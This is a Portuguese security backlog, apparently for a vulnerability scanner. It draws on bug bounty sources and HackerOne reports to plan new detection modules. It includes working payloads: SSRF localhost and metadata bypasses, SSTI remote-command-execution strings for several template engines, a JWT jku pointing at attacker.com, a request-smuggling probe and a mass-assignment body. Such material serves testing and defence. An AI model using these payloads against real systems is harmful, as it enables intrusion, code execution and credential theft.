# Backlog de Segurança — Derivado de SecurityTesting-master, KingOfBugBountyTips, HackerOne Reports
**Gerado em:** 2026-10-22  
**Fontes:** SecurityTesting-master · KingOfBugBountyTips-master · hackerone-reports (TOPSSRF, TOPSSTI, TOPXXE, TOPIDOR, TOPREQUESTSMUGGLING, TOPWEBCACHE, TOPRACECONDITION, TOPSUBDOMAINTAKEOVER, TOPAUTH)

---

## Melhorias para módulos existentes

### SSRF — novos bypasses
- IPv6: `http://[::]:80/`, `http://[::ffff:127.0.0.1]/`
- Decimal: `http://2130706433/`
- Hex: `http://0x7f000001/`
- Octal: `http://017700000001`, `http://0177.00.00.01`
- Short-form: `http://127.1/`
- Credencial embedding: `http://whitelisted@127.0.0.1`
- Unicode: `http://⑯⑨。②⑤④。⑯⑨｡②⑤④/`
- NAT64: `64:ff9b::127.0.0.1` (H1 #3634400)
- Trailing dot: `http://internal.service.com./admin` (H1 #1410214, Stripe)
- DNS rebind: `http://7f000001.burpcollaborator.net`
- **Vetores indiretos de alta frequência:** upload de imagem/PDF, webhook_url, callback_url, ping_url, GraphQL com campos de URL
- **Redirect bypass:** 301 para 169.254.169.254 — filtros bloqueiam IP direto mas seguem redirect
- **SSRF via SVG upload:** H1 #897244 (112 upvotes) — SVG com `<!ENTITY>` como imagem
- **SSRF via Host Header:** H1 #2696271 (75 upvotes)

### JWT — técnicas não cobertas
- **kid path traversal:** `"kid": "../../dev/null"` → HS256 com segredo vazio
- **jku tampering:** `"jku": "https://attacker.com/jwks.json"` → server busca JWK set externo
- **x5u tampering:** análogo ao jku, para certificados X.509
- **iss/aud manipulation:** cross-tenant com claim não validado
- **Weak HS256 cracking:** hashcat `-m 16500`

### CORS — regex bypasses
- `evil.trusted.com` — bypassa `endsWith("trusted.com")`
- `trusted.com.evil.com` — bypassa `startsWith("trusted.com")`
- `trusted.com%60.evil.com` — backtick bypass (Chrome)
- `null` via sandbox iframe

### SSTI — payloads por engine
```
Jinja2:    {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Twig:      {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
Smarty:    {php}echo shell_exec('id');{/php}
FreeMarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
ERB:       <%= system("id") %>
Polimórfico: }}{{7*7}}[[7*7]]${7*7}<%= 7*7 %>
```

### XXE — vetores adicionais
- SVG upload (H1 #897244 — Zivver, 112 upvotes)
- DOCX/XLSX/PPTX upload — ZIP com XML interno (H1 #334488, $2000)
- JPEG XMP metadata (H1 #836877, 138 upvotes)
- SAML assertion (H1 #106865)
- OOB via DTD externo quando output direto bloqueado

### IDOR — além de /users/:id
- GraphQL mutations sem ownership check (H1 #2122671, 394 upvotes; H1 #984965 TikTok, 84 upvotes; H1 #2207248 Shopify, $5000)
- DELETE sem validação de ownership (H1 #380410 Pornhub, $1500)
- Download de documentos por ID numérico (H1 #1626508)
- Price manipulation (H1 #1403176 Acronis, 146 upvotes)

### CRLF — vetores adicionais
- Inject via User-Agent, Referer, Accept-Language (não só query params)
- `%0d%0a` em valores de cookie
- CRLF → Response Splitting → cache poisoning
- CRLF → injetar `Content-Type: text/html` + XSS no body

### OpenRedirect — bypasses
- `https://target.com@evil.com` — user-info parsing
- `//evil.com` — protocol-relative
- `https%3A%2F%2Fevil.com` — URL encoded scheme
- `\evil.com` — backslash normalizado para / em browsers

---

## Novos módulos candidatos (priorizado por impacto/frequência H1)

### 1. HTTP Request Smuggling (CRITICAL)
**Detecção:** CL.TE, TE.CL, TE.TE obfuscation, HTTP/2 downgrade  
**Reports:** Slack H1 #737140 (868 upvotes, ATO), LY H1 #740037 (564), Zomato H1 #771666 (559), Basecamp H1 #1211724 ($7500)  
**Probe CL.TE:**
```
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
TE obfuscation: `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`, `Transfer-Encoding:\x0bchunked`

### 2. Web Cache Poisoning / Cache Deception (HIGH)
**Detecção:** Headers unkeyed (`X-Forwarded-Host`, `X-Forwarded-Scheme`), URL com extensão estática em rota dinâmica  
**Reports:** PayPal H1 #622122 ($9700, 851 upvotes), Shopify H1 #1096609 ($2900), Glassdoor H1 #1424094 (stored XSS)  
**Indicadores:** `X-Cache: HIT`, `CF-Cache-Status: HIT`, `Age: N > 0`

### 3. Host Header Injection (MEDIUM-HIGH)
**Detecção:** `Host: evil.com` em forgot-password, `X-Forwarded-Host: evil.com`  
**Reports:** IBM H1 #2696271 (75 upvotes SSRF), DoD H1 #2188240  
**Indicadores:** URL no body/Location usa o Host injetado; email de reset com domínio do attacker

### 4. Race Condition (HIGH)
**Detecção:** 10-50 requests paralelos a endpoints de state-change (cupons, trials, OTP, contadores)  
**Reports:** H1 #759247 (308 upvotes), H1 #429026 ($2500, 239 upvotes), H1 #2598548 (2FA bypass, 139 upvotes)  
**Indicadores:** Múltiplos 200 com `success: true` para operação "de uma vez só"

### 5. Mass Assignment (HIGH)
**Detecção:** POST/PUT com campos extras (`admin: true`, `role: "admin"`, `balance: 99999`)  
**Indicadores:** Campo refletido no response ou persiste no GET  
```json
{"admin":true,"role":"admin","isAdmin":true,"balance":99999,"verified":true,"subscription_plan":"enterprise"}
```

### 6. Spring Actuator Exposure (CRITICAL)
**Detecção:** GET /actuator, /actuator/env, /actuator/heapdump, /actuator/mappings, /actuator/beans  
**Reports:** LINE/LY H1 #838635 ($12500, 234 upvotes)  
**Indicadores:** 200 em `/actuator/env` → credenciais; 200 em `/actuator/heapdump` → heap dump com passwords

### 7. Subdomain Takeover (MEDIUM-HIGH)
**Detecção:** CNAME resolve para serviço externo não-registrado (S3 NoSuchBucket, Heroku "No such app", GitHub Pages, Vercel, Fastly, Surge, Zendesk, Ghost)  
**Reports:** Roblox H1 #335330 (782 upvotes, auth bypass)

### 8. 2FA/OTP Bypass (HIGH)
**Detecção:** Rate limit ausente em OTP, OTP reutilizável, race condition, path bypass  
**Reports:** H1 #2598548 (139 upvotes), H1 #2529780 (OTP reusável), H1 #1842183 (LinkedIn)

### 9. BFLA — Broken Function Level Authorization (HIGH)
**Detecção:** Endpoints `/admin/` testados com token de user regular, HTTP method fuzzing (DELETE/PUT em rotas GET)  
**Indicadores:** 200/204 onde esperado 403

---

## Top 10 insights dos HackerOne reports

1. **Upload de mídia é o principal vetor SSRF** — 20+ reports de alto upvote. `webhook_url`, `callback_url`, `ping_url` são SSRF em 50%+ das apps
2. **HTTP Request Smuggling domina os de maior upvote** (868, 564, 559) — subrepresentado em scanners automáticos
3. **IDOR via GraphQL mutations** é o vetor moderno mais common — H1 #2122671 (394 upvotes), H1 #2207248 ($5000)
4. **Spring Actuator `/heapdump`** vale mais que parece — um report valeu $12500 no LINE
5. **Race condition em business logic** é técnica simples com impacto alto — gift cards, cupons, 2FA, "um uso por usuário"
6. **Web Cache Deception não exige bug no código** — só CDN mal-configurado (Cloudflare, Varnish, Nginx by default)
7. **Subdomain takeover → auth bypass** é a chain de maior impacto (Roblox, 782 upvotes)
8. **A maioria do SSRF em produção usa redirect** — filtros bloqueiam IP direto, mas 301 para 169.254.x.x passa
9. **Webhook = SSRF garantido em 50%+ dos apps** — Omise H1 #508459 ($0 mas AWS keys)
10. **2FA bypass via race condition** — mesmo OTPs corretos podem ser aceitos múltiplas vezes se o server não é transacional

---

## Sprints sugeridos (baseados nesta análise)

| Sprint | Módulo | Motivo |
|--------|--------|--------|
| 18 | SSRF melhorado (IP encoding + redirect bypass + webhook) | Maior ROI por patches mínimas no módulo existente |
| 19 | Host Header Injection | Simples de detectar, cobre SSRF + password reset poisoning |
| 20 | Spring Actuator Exposure | Um request por endpoint, retorno alto |
| 21 | Mass Assignment | Payload único em POST/PUT, fácil de implementar |
| 22 | HTTP Request Smuggling | Técnico mas highest upvote em H1 |
| 23 | Web Cache Poisoning | Headers unkeyed, fácil probe |
| 24 | Subdomain Takeover | CNAME + fingerprint por serviço |
| 25 | JWT kid/jku injection | Melhoria do módulo existente |
| 26 | SSTI motor-específico (RCE payloads) | Upgrade do módulo existente |
